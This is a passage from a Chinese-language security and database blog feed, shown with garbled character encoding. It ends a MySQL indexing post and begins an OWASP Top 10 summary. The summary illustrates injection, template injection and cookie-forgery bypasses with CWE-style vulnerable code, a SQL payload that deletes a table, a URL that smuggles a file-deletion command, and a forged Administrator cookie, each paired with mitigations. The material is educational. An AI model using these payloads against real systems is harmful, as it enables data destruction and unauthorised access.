</span></code></pre></li><li><p>likeä»¥é€šé…ç¬¦å¼€å¤´<code>(&#39;%abc...&#39;)</code>æ—¶ç´¢å¼•ä¹Ÿä¼šå¤±æ•ˆï¼Œå˜ä¸ºå…¨è¡¨æ‰«æï¼›ä½†é€šé…ç¬¦ç»“å°¾ä¾ç„¶ä¼šèµ°ç´¢å¼•ï¼Œè¯¥å­—æ®µåçš„ç´¢å¼•ä¾ç„¶å¤±æ•ˆ</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> name<span class="token punctuation">,</span> age <span class="token keyword">from</span> info <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">"%aaa"</span><span class="token punctuation">;</span>  <span class="token comment">## ç´¢å¼•å¤±æ•ˆ  </span><span class="token keyword">select</span> name<span class="token punctuation">,</span> age <span class="token keyword">from</span> info <span class="token keyword">where</span> name <span class="token operator">like</span> <span class="token string">"aaa%"</span><span class="token punctuation">;</span>  <span class="token comment">## ç´¢å¼•æœ‰æ•ˆ  </span><span class="token comment">## å½“ä¸šåŠ¡è¦æ±‚å¿…é¡»ä½¿ç”¨å·¦é€šé…ç¬¦æ—¶ï¼Œå¯ä½¿ç”¨è¦†ç›–ç´¢å¼•çš„æ–¹æ³•æ¥é¿å…ç´¢å¼•å¤±æ•ˆ  </span><span class="token comment">## åœ¨ä¸Šé¢ä¾‹å­ä¸­å³å»ºç«‹è”åˆç´¢å¼• name_age</span></code></pre></li><li><p>å­—ç¬¦ä¸²ä¸åŠ å•å¼•å·ä¼šå¯¼è‡´ç´¢å¼•å¤±æ•ˆ   åŸå› ï¼šéšå¼è½¬æ¢</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">## idä¸ºvarcharç±»å‹  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'2000'</span><span class="token punctuation">;</span>  <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">2000</span><span class="token punctuation">;</span>  <span class="token comment">## ä¼šæœ‰éšå¼ç±»å‹è½¬æ¢</span></code></pre></li><li><p>å°½é‡å°‘ç”¨orï¼Œç”¨å®ƒæ¥è¿æ¥æŸ¥è¯¢æ¡ä»¶å¯èƒ½ä¼šå¯¼è‡´ç´¢å¼•å¤±æ•ˆ</p></li><li><p>group byåŸºæœ¬ä¸Šéƒ½éœ€è¦è¿›è¡Œæ’åºï¼Œå½“group byçš„å­—æ®µé¡ºåºå’Œç´¢å¼•é¡ºåºä¸ä¸€è‡´çš„æ—¶å€™ï¼Œå°±ä¼šå¯¼è‡´ä¸´æ—¶è¡¨çš„äº§ç”Ÿï¼Œå³åŒæ—¶å‡ºç° Using temporary å’Œ Using filesortï¼Œå› æ­¤ä¸€å®šè¦æåŠ›é¿å…</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">## ç´¢å¼•ä¸º A_B_C  </span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> info <span class="token keyword">where</span> A<span class="token operator">=</span><span class="token number">10</span> <span class="token keyword">group</span> <span class="token keyword">by</span> C<span class="token punctuation">,</span> B<span class="token punctuation">;</span>  <span class="token comment">## èµ°ç´¢å¼•Aï¼Œäº§ç”Ÿä¸´æ—¶è¡¨</span></code></pre></li></ul><p><strong>å°ç»“</strong></p><ul><li>å¯¹äºå•å€¼ç´¢å¼•ï¼Œå°½é‡é€‰æ‹©é’ˆå¯¹å½“å‰æŸ¥è¯¢è¿‡æ»¤æ€§æ›´å¥½çš„ç´¢å¼•å­—æ®µ</li><li>åœ¨é€‰æ‹©è”åˆç´¢å¼•æ—¶ï¼Œå½“å‰æŸ¥è¯¢ä¸­è¿‡æ»¤æ€§æœ€å¥½çš„å­—æ®µåœ¨ç´¢å¼•å­—æ®µé¡ºåºä¸­ä½ç½®è¶Šé å‰è¶Šå¥½</li><li>åœ¨é€‰æ‹©è”åˆç´¢å¼•æ—¶ï¼Œå°½å¯èƒ½é€‰æ‹©å¯ä»¥åŒ…å«å½“å‰æŸ¥è¯¢çš„whereå­å¥ä¸­æ›´å¤šå­—æ®µçš„ç´¢å¼•ï¼Œå³å¦‚æœå¯èƒ½çš„è¯ï¼Œå°½é‡è¾¾åˆ°ç´¢å¼•è¦†ç›–ï¼Œè¿™æ ·ä¸ä»…èƒ½å¤Ÿé¿å…ç´¢å¼•å¤±æ•ˆï¼Œä¹Ÿèƒ½å¤Ÿé¿å…å›è¡¨ç­‰å½±å“æŸ¥è¯¢æ€§èƒ½ç­‰æ“ä½œ</li><li>å°½å¯èƒ½é€šè¿‡åˆ†æç»Ÿè®¡ä¿¡æ¯å’Œè°ƒæ•´æŸ¥è¯¢è¯­å¥çš„å†™æ³•æ¥è¾¾åˆ°é€‚åº”é€‰æ‹©çš„ç´¢å¼•</li></ul><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ol><li><a href="https://dev.mysql.com/doc/refman/5.7/en/innodb-storage-engine.html">The InnoDB Storage Engine</a></li><li><a href="https://dev.mysql.com/doc/refman/5.7/en/storage-engines.html">Alternative Storage Engines</a></li><li><a href="https://github.com/jaywcjlove/mysql-tutorial/blob/master/chapter3/3.5.md">æ•°æ®åº“å­˜å‚¨å¼•æ“</a></li><li><a href="https://juejin.cn/post/6854573221627297800">ç®€å•äº†è§£InnoDBåº•å±‚åŸç†</a></li><li><a href="https://zq99299.github.io/dsalg-tutorial/dsalg-java-hsp/12/03.html#b-%E6%A0%91">B æ ‘ã€B+ æ ‘ã€B*æ ‘</a></li><li><a href="https://segmentfault.com/a/1190000021488885">ä¸ºä»€ä¹ˆmysqlç´¢å¼•è¦ä½¿ç”¨B+æ ‘ï¼Œè€Œä¸æ˜¯Bæ ‘ï¼Œçº¢é»‘æ ‘</a></li><li><a href="https://juejin.cn/post/6844903919525740552">MySQLç´¢å¼•çš„åŸç†ï¼ŒB+æ ‘ã€èšé›†ç´¢å¼•å’ŒäºŒçº§ç´¢å¼•çš„ç»“æ„åˆ†æ</a></li><li><a href="https://segmentfault.com/a/1190000023441683">MySQLä¼˜åŒ–ä¹‹ç´¢å¼•ä¼˜åŒ–</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;MySQLå­˜å‚¨å¼•æ“&quot;&gt;&lt;a href=&quot;#MySQLå­˜å‚¨å¼•æ“&quot; class=&quot;headerlink&quot; title=&quot;MySQLå­˜å‚¨å¼•æ“&quot;&gt;&lt;/a&gt;MySQLå­˜å‚¨å¼•æ“&lt;/h3&gt;&lt;p&gt;å­˜å‚¨å¼•æ“æ˜¯MySQLç»„ä»¶ï¼Œç”¨äºå¤„ç†ä¸åŒç±»å‹çš„SQLæ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ &lt;a 
      
    
    </summary>
    
    
      <category term="å¤‡å¿˜å½•" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="SQL" scheme="https://www.extrader.top/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>Owasp_Top_10</title>
    <link href="https://www.extrader.top/posts/db657c/"/>
    <id>https://www.extrader.top/posts/db657c/</id>
    <published>2021-01-30T02:49:21.000Z</published>
    <updated>2021-01-30T10:00:35.063Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://owasp.org/">Owasp</a> å…¨ç§° Open Web Application Security Projectï¼ˆå¼€æ”¾å¼Webåº”ç”¨ç¨‹åºå®‰å…¨é¡¹ç›®ï¼‰ã€‚</p><p>å…¶ä¸­æœ€å…·æƒå¨çš„å°±æ˜¯å…¶â€åå¤§å®‰å…¨æ¼æ´åˆ—è¡¨â€ï¼Œç›®å‰æ­£å¼å‘å¸ƒçš„æœ€æ–°ç‰ˆæœ¬æ˜¯2017å¹´11æœˆä»½å‘å¸ƒçš„ã€‚</p><p>ä»¥ä¸‹å¯¹2017å¹´çš„Top 10ç‰ˆæœ¬åšä¸€ä¸ªå½’çº³ï¼Œä¾‹å­ä¸­ä¸å…¨çš„æ¬¢è¿å„ä½å¤§ä½¬è¯„è®ºæŒ‡å‡ºï¼Œåç»­æœ‰ä¼šæ·»åŠ ä¸Šã€‚</p><span id="more"></span><h3 id="æ³¨å…¥ï¼ˆInjectionï¼‰"><a href="#æ³¨å…¥ï¼ˆInjectionï¼‰" class="headerlink" title="æ³¨å…¥ï¼ˆInjectionï¼‰"></a>æ³¨å…¥ï¼ˆInjectionï¼‰</h3><h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>å½“ä¸å¯ä¿¡çš„æ•°æ®ä½œä¸ºå‘½ä»¤æˆ–æŸ¥è¯¢è¯­å¥çš„ä¸€éƒ¨åˆ†è¢«å‘é€ç»™è§£é‡Šå™¨çš„æ—¶å€™ï¼Œä¼šå‘ç”Ÿæ³¨å…¥æ¼æ´ï¼ŒåŒ…æ‹¬SQLã€NoSQLã€OSä»¥åŠLDAPæ³¨å…¥ç­‰ã€‚æ”»å‡»è€…å‘é€çš„æ¶æ„æ•°æ®å¯èƒ½ä¼šè¯±ä½¿è§£é‡Šå™¨æ‰§è¡Œè®¡åˆ’å¤–çš„å‘½ä»¤ï¼Œæˆ–åœ¨æ²¡æœ‰é€‚å½“æˆæƒçš„æƒ…å†µä¸‹è®¿é—®æ•°æ®ã€‚</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><h5 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h5><pre class="language-c#" data-language="c#"><code class="language-c#">string userName &#x3D; ctx.getAuthenticatedUserName();string query &#x3D; &quot;SELECT * FROM items WHERE owner &#x3D; &#39;&quot; + userName + &quot;&#39; AND itemname &#x3D; &#39;&quot; + ItemName.Text + &quot;&#39;&quot;;sda &#x3D; new SqlDataAdapter(query, conn);DataTable dt &#x3D; new DataTable();sda.Fill(dt);</code></pre><p>æ”¹ä»£ç å‡†å¤‡æ‰§è¡Œçš„æŸ¥è¯¢å¦‚ä¸‹ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> items <span class="token keyword">WHERE</span> owner <span class="token operator">=</span> <span class="token operator">&lt;</span>userName<span class="token operator">></span> <span class="token operator">AND</span> itemname <span class="token operator">=</span> <span class="token operator">&lt;</span>itemName<span class="token operator">></span><span class="token punctuation">;</span></code></pre><p>ä½†æ˜¯æŸ¥è¯¢æ˜¯é€šè¿‡å›ºå®šçš„æŸ¥è¯¢å­—ç¬¦å’Œç”¨æˆ·çš„è¾“å…¥å­—ç¬¦ä¸²è¿æ¥æ¥åŠ¨æ€æ„æˆçš„ï¼Œè‹¥æ”»å‡»è€…åœ¨<code>owner</code>å¤„æ„é€ <code>name&#39;; DELETE FROM items; --</code>ï¼Œåˆ™SQLè¯­å¥å˜æˆäº†</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> items <span class="token keyword">WHERE</span> owner <span class="token operator">=</span> <span class="token string">'wiley'</span> <span class="token operator">AND</span> itemname <span class="token operator">=</span> <span class="token string">'name'</span><span class="token punctuation">;</span> <span class="token keyword">DELETE</span> <span class="token keyword">FROM</span> items<span class="token punctuation">;</span> <span class="token comment">--'</span></code></pre><p>å‚è€ƒï¼š<a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: SQL Injection</a></p><p>æœ¬ç«™æ¡ˆä¾‹ï¼š<a href="https://www.extrader.top/posts/e73517db/">CTF-SQLæ³¨å…¥</a>ï¼Œ<a href="https://www.extrader.top/posts/e5cd0178/">Sqli-labsé¶åœº</a></p><h5 id="å‘½ä»¤æ³¨å…¥"><a href="#å‘½ä»¤æ³¨å…¥" class="headerlink" title="å‘½ä»¤æ³¨å…¥"></a>å‘½ä»¤æ³¨å…¥</h5><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> btype <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"backuptype"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">String</span> cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token string">"cmd.exe /K \" c:\\util\\rmanDB.bat "</span> <span class="token operator">+</span> btype <span class="token operator">+</span> <span class="token string">"&amp;&amp;c:\\utl\\cleanup.bat\""</span><span class="token punctuation">)</span><span class="token class-name">System<span class="token punctuation">.</span>Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>ä»¥ä¸Šä»£ç æ¥è‡ªä¸€ä¸ªç®¡ç†webçš„åº”ç”¨ç¨‹åºï¼Œæ”¹ç¨‹åºæ—¨åœ¨å…è®¸ç”¨æˆ·ä½¿ç”¨æ‰¹å¤„ç†æ–‡ä»¶ç¨‹åºæ¥å¯¹Oracleæ•°æ®åº“è¿›è¡Œå¤‡ä»½ï¼Œç„¶åè¿è¡Œ<code>cleanup.bat</code>è„šæœ¬åˆ é™¤ä¸€äº›ä¸´æ—¶æ–‡ä»¶ï¼Œå¤‡ä»½è„šæœ¬<code>rmanDB.bat</code>æ¥æ”¶å•ä¸ªå‘½ä»¤å‚æ•°ï¼Œè¯¥å‚æ•°æŒ‡å®šè¦æ‰§è¡Œçš„å¤‡ä»½ç±»å‹ï¼Œç”±äºå¯¹æ•°æ®åº“çš„è®¿é—®å—åˆ°é™åˆ¶ï¼Œå› æ­¤è¯¥å¤‡ä»½è„šæœ¬é€šå¸¸æ˜¯ä»¥ç‰¹æƒç”¨æˆ·èº«ä»½è¿è¡Œçš„</p><p>é€šå¸¸<code>Runtime.exec()</code>å‡½æ•°ä¸ä¼šæ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œä½†æ˜¯åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œç¨‹åºé¦–å…ˆè¿è¡Œ<code>cmd.exe shell</code>ï¼Œä»¥ä¾¿é€šè¿‡ä¸€æ¬¡è°ƒç”¨<code>Runtime.exec()</code>æ¥è¿è¡Œå¤šä¸ªå‘½ä»¤ã€‚è°ƒç”¨å®Œ<code>rmanDB</code>åï¼Œæ¥ç€è°ƒç”¨ç”±<code>&amp;&amp;</code>åˆ†éš”çš„å¤šä¸ªå‘½ä»¤ã€‚è‹¥æ”»å‡»è€…ä¼ å…¥çš„å­—ç¬¦ä¸²å½¢å¼ä¸º<code>&amp; del c:\\dbms\\*.*</code>ï¼Œé‚£ä¹ˆè¯¥åº”ç”¨ç¨‹åºå°†æ‰§è¡Œæ­¤å‘½ä»¤ä»¥åŠæ”»å‡»è€…ä¼ å…¥çš„å…¶å®ƒå‘½ä»¤ <code>del</code></p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//example.com/app/accountView?backuptype=&amp; del c:\\dbms\\*.*</code></pre><p>å‚è€ƒï¼š<a href="https://cwe.mitre.org/data/definitions/77.html">CWE-77: Command Injection</a></p><p>æœ¬ç«™æ¡ˆä¾‹ï¼š<a href="https://www.extrader.top/posts/c714e372/">CTF-å‘½ä»¤æ‰§è¡Œ</a>ï¼Œ<a href="https://www.extrader.top/posts/45c7e77/">phpå‘½ä»¤æ‰§è¡Œå°æŠ€å·§</a></p><h5 id="æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰"><a href="#æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰" class="headerlink" title="æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰"></a>æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆSSTIï¼‰</h5><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'/../lib/Twig/Autoloader.php'</span><span class="token punctuation">;</span><span class="token class-name static-context">Twig_Autoloader</span><span class="token operator">::</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$twig</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Twig_Environment</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Twig_Loader_String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$output</span> <span class="token operator">=</span> <span class="token variable">$twig</span><span class="token operator">-></span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hello <span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºæ¨¡ç‰ˆå†…å®¹çš„ä¸€éƒ¨åˆ†</span><span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span></span></code></pre><p>è¯¥æ®µä»£ç ä½¿å¾—ç”¨æˆ·å¯ä»¥åœ¨å‘é€ç”µå­é‚®ä»¶ä¹‹å‰è‡ªå®šä¹‰ä½¿ç”¨çš„åç§°ï¼Œä½†æ˜¯è‹¥æ”»å‡»è€…ä¸å°†é™æ€å€¼ä¼ é€’åˆ°æ¨¡æ¿ä¸­ï¼Œè€Œæ˜¯ä½¿ç”¨GETå‚æ•°åŠ¨æ€ç”Ÿæˆæ¨¡æ¿æœ¬èº«çš„ä¸€éƒ¨åˆ†nameï¼Œå¦‚ä¸‹æ‰€ç¤º</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header-name keyword">http:</span>//vulnerable-website.com/?name=IsVuln&#123;# comment #&#125;&#123;&#123;2*8&#125;&#125;OK</code></pre><p>ç”±äº <code>&#123;# comment #&#125;</code> ä½œä¸º Twig æ¨¡æ¿å¼•æ“çš„é»˜è®¤æ³¨é‡Šå½¢å¼ï¼Œæ‰€ä»¥åœ¨å‰ç«¯è¾“å‡ºçš„æ—¶å€™å¹¶ä¸ä¼šæ˜¾ç¤ºï¼Œè€Œ <code>&#123;&#123;2*8&#125;&#125;</code> ä½œä¸ºæ¨¡æ¿å˜é‡æœ€ç»ˆä¼šè¿”å› 16 ä½œä¸ºå…¶å€¼è¿›è¡Œæ˜¾ç¤ºï¼Œå› æ­¤å‰ç«¯æœ€ç»ˆä¼šè¿”å›å†…å®¹ <code>Hello IsVuln16OK</code></p><p>å‚è€ƒï¼š<a href="https://portswigger.net/kb/issues/00101080_serversidetemplateinjection">PortSwigger: Server-side template injection</a>ï¼Œ<a href="https://blog.knownsec.com/2015/11/server-side-template-injection-attack-analysis/">æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥æ”»å‡» (SSTI) ä¹‹æµ…æ</a></p><p>æœ¬ç«™æ¡ˆä¾‹ï¼š<a href="https://www.extrader.top/posts/47d18edd/">CTF-SSTI</a></p><h4 id="Prevent"><a href="#Prevent" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>ä½¿ç”¨å®‰å…¨çš„API</li><li>ä½¿ç”¨â€œç™½åå•â€å¯¹æœåŠ¡å™¨ç«¯çš„è¾“å…¥è¿›è¡ŒéªŒè¯</li><li>ä½¿ç”¨ç‰¹å®šçš„è½¬ä¹‰è¯­æ³•æ¥è½¬ä¹‰ç‰¹æ®Šå­—</li><li>åœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨LIMITå’Œå…¶ä»–SQLæ§ä»¶ï¼Œé˜²æ­¢SQLæ³¨å…¥çš„æƒ…å†µä¸‹å¤§é‡æ³„éœ²è®°å½•</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">A1:2017-Injection</a></p><h3 id="å¤±æ•ˆçš„èº«ä»½è®¤è¯"><a href="#å¤±æ•ˆçš„èº«ä»½è®¤è¯" class="headerlink" title="å¤±æ•ˆçš„èº«ä»½è®¤è¯"></a>å¤±æ•ˆçš„èº«ä»½è®¤è¯</h3><h4 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>é€šè¿‡ä¸è§„èŒƒçš„ä½¿ç”¨åº”ç”¨ç¨‹åºçš„èº«ä»½è®¤è¯å’Œä¼šè¯ç®¡ç†åŠŸèƒ½ï¼Œä»è€Œä½¿æ”»å‡»è€…èƒ½å¤Ÿç ´è¯‘å¯†ç ï¼Œå¯†é’¥æˆ–ä¼šè¯ä»¤ç‰Œï¼Œæˆ–è€…æš‚æ—¶æˆ–æ°¸ä¹…çš„å†’å……å…¶å®ƒç”¨æˆ·çš„èº«ä»½</p><h4 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h4><pre class="language-perl" data-language="perl"><code class="language-perl"><span class="token keyword">my</span> $<span class="token string">q = new CGI;if ($q->cookie('loggedin') ne "true") &#123;    if (! AuthenticateUser($q->param('username'), $q->param('password'))) &#123;    ExitError("Error: you need to log in first");    &#125;else &#123;        # Set loggedin and user cookies.        $q->cookie(        -name =</span><span class="token operator">></span> <span class="token string">'loggedin'</span><span class="token punctuation">,</span>        <span class="token operator">-</span>value <span class="token operator">=></span> <span class="token string">'true'</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        $<span class="token string">q->cookie(        -</span>name <span class="token operator">=></span> <span class="token string">'user'</span><span class="token punctuation">,</span>        <span class="token operator">-</span>value <span class="token operator">=></span> $<span class="token string">q->param('username')        );    &#125;&#125;if ($q-</span><span class="token operator">></span>cookie<span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span> <span class="token operator">eq</span> <span class="token string">"Administrator"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>DoAdministratorTasks<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ä»¥ä¸Šä»£ç æ—¨åœ¨ç¡®ä¿ç”¨æˆ·å·²ç»ç™»å½•ï¼Œå¦‚æœæœªç™»å½•ï¼Œåˆ™ä»£ç å°†ä½¿ç”¨ç”¨æˆ·æä¾›çš„ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå¦‚æœæˆåŠŸï¼Œå®ƒå°†ç™»å½•ç”¨æˆ·å¹¶å°†ç”¨æˆ·çš„cookieè®¾ç½®ä¸ºâ€œè®°ä½â€ç”¨æˆ·å·²ç»ç™»å½•ï¼Œæœ€åï¼Œå¦‚æœç™»å½•çš„ç”¨æˆ·çš„cookieä¸­å…·æœ‰â€œç®¡ç†å‘˜â€ç”¨æˆ·åï¼Œåˆ™ä»£ç å°†æ‰§è¡Œç®¡ç†å‘˜ä»»åŠ¡ã€‚</p><p>ç„¶è€Œï¼Œè¿™æ®µä»£ç æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œæ”»å‡»è€…å¯ä»¥ç‹¬ç«‹è®¾ç½®cookieï¼Œä½¿å¾—ä»£ç ä¸ä¼šæ£€æŸ¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶ä¸”è¿˜å¯ä»¥ä¼ªé€ â€œç®¡ç†å‘˜â€èº«ä»½è¿›è¡Œæ“ä½œï¼Œä¼ªé€ çš„requestå¤´å¦‚ä¸‹ï¼š</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/cgi-bin/vulnerable.cgi</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header-name keyword">Cookie:</span> user=Administrator<span class="token header-name keyword">Cookie:</span> loggedin=true</code></pre><p>é€šè¿‡å°†ç™»å½•çš„cookie loggedinè®¾ç½®ä¸ºâ€œtrueâ€ï¼Œæ”»å‡»è€…å°†ç»•è¿‡æ•´ä¸ªèº«ä»½è®¤è¯ï¼›é€šè¿‡ä½¿cookie userä¸ºâ€œAdministratorâ€å€¼ï¼Œä»è€Œè·å¾—ç®¡ç†å‘˜æƒé™</p><p>å‚è€ƒï¼š<a href="https://cwe.mitre.org/data/definitions/287.html">CWE-287: Improper Authentication</a></p><h4 id="Prevent-1"><a href="#Prevent-1" class="headerlink" title="Prevent"></a>Prevent</h4><ol><li>å®æ–½å¤šå› ç´ èº«ä»½è®¤è¯ï¼Œä»¥é˜²æ­¢è‡ªåŠ¨è¿›è¡Œå‡­æ®å¡«å……ï¼Œæš´åŠ›ç ´è§£å’Œå‡­æ®é‡ç”¨æ”»å‡»</li><li>ä¸é€‚ç”¨é»˜è®¤å¯†ç ï¼Œå¼±å¯†ç ï¼Œå°¤å…¶æ˜¯å¯¹äºç®¡ç†å‘˜ç”¨æˆ·</li><li>å®æ–½å¯†ç æ£€æµ‹ï¼Œé™åˆ¶å¯†ç é•¿åº¦ï¼Œå¤æ‚æ€§</li><li>é™åˆ¶ç™»å½•å¤±è´¥æ¬¡æ•°ï¼Œé¢‘ç¹çš„ç™»å½•å°è¯•ï¼Œè®°å½•æ•…éšœï¼Œå¹¶åœ¨æ£€æµ‹åˆ°æ”»å‡»æ—¶æé†’ç®¡ç†å‘˜</li><li>é€‚ç”¨æœåŠ¡å™¨ç«¯å®‰å…¨çš„å†…ç½®ä¼šè¯ç®¡ç†å™¨</li></ol><p>å‚è€ƒï¼š<a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">A2:2017-Broken Authentication</a></p><h3 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>æ•æ„Ÿä¿¡æ¯æ³„éœ²</h3><h4 id="ç®€ä»‹-2"><a href="#ç®€ä»‹-2" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>æˆ‘ä»¬çš„æ•æ„Ÿä¿¡æ¯åŒ…æ‹¬å¯†ç ã€è´¢åŠ¡æ•°æ®ã€åŒ»ç–—æ•°æ®ç­‰ï¼Œç”±äºwebåº”ç”¨æˆ–è€…APIæœªåŠ å¯†æˆ–ä¸æ­£ç¡®çš„ä¿æŠ¤æ•æ„Ÿæ•°æ®ï¼Œè¿™äº›æ•°æ®ææ˜“é­åˆ°æ”»å‡»è€…åˆ©ç”¨ï¼Œæ”»å‡»è€…å¯èƒ½ä½¿ç”¨è¿™äº›æ•°æ®æ¥è¿›è¡Œä¸€äº›çŠ¯ç½ªè¡Œä¸ºï¼Œå› æ­¤ï¼ŒæœªåŠ å¯†çš„ä¿¡æ¯ææ˜“é­åˆ°ç ´åå’Œåˆ©ç”¨ï¼Œæˆ‘ä»¬åº”è¯¥åŠ å¼ºå¯¹æ•æ„Ÿæ•°æ®çš„ä¿æŠ¤ï¼Œwebåº”ç”¨åº”è¯¥åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­æ•°æ®ã€å­˜å‚¨çš„æ•°æ®ä»¥åŠå’Œæµè§ˆå™¨çš„äº¤äº’æ—¶çš„æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œä¿è¯æ•°æ®å®‰å…¨ã€‚</p><h4 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">persistLogin</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"username"</span> <span class="token operator">=></span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"password"</span><span class="token operator">=></span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"userdata"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æ­¤ä»£ç å°†ç”¨æˆ·çš„ä¿¡æ¯å†™å…¥cookieï¼Œå› æ­¤ç”¨æˆ·ä»¥åä¸å¿…å†æ¬¡ç™»å½•</p><p>è¯¥ä»£ç ä»¥çº¯æ–‡æœ¬çš„æ ¼å¼å°†ç”¨æˆ·çš„ç”¨æˆ·åå’Œå¯†ç å­˜å‚¨åœ¨è®¡ç®—æœºçš„cookieä¸­ï¼Œå¦‚æœæ”»å‡»è€…ç 